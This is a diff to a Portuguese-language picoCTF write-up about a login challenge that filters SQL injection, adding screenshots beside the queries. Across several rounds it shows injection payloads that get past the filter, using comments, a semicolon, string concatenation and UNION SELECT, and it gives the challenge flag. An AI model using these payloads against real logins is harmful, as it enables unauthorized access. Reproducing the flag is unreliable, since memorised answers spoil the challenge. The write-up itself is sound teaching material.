@@ -54,6 +54,8 @@ Senha: qualquercoisa
 ```
 SELECT * FROM users WHERE username='admin' /*' AND password='1'
 ```
+![image](https://github.com/user-attachments/assets/7738cde6-f6ab-4da1-bf65-a3a4ad9867c0)
+
 O filtro continuou permitindo que a parte da senha fosse ignorada e o login fosse feito com sucesso.
 
 **Round 3:**
@@ -67,6 +69,8 @@ Senha: qualquercoisa
 ```
 SELECT * FROM users WHERE username='admin';' AND password='123'
 ```
+![image](https://github.com/user-attachments/assets/29982171-23a7-4856-aa8c-0b9d03ef0117)
+
 O uso do ; separou as duas partes da consulta, mas a aplicação não alterou a execução.
 
 **Round 4:**
@@ -80,6 +84,9 @@ Senha: qualquercoisa
 ```
 SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
 ```
+
+![image](https://github.com/user-attachments/assets/eb5ebfc5-0262-4769-bd60-80975db3cd4a)
+
 A aplicação aceitou a injeção e conseguimos passar para o próximo round.
 
 **Round 5:**
@@ -93,6 +100,9 @@ Senha: qualquercoisa
 ```
 SELECT * FROM users WHERE username='admin' UNION SELECT 1,2,3,4--'
 ```
+
+![Uploading image.png…]()
+
 Com isso, conseguimos obter a instrução para acessar o filter.php.
 
 > Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
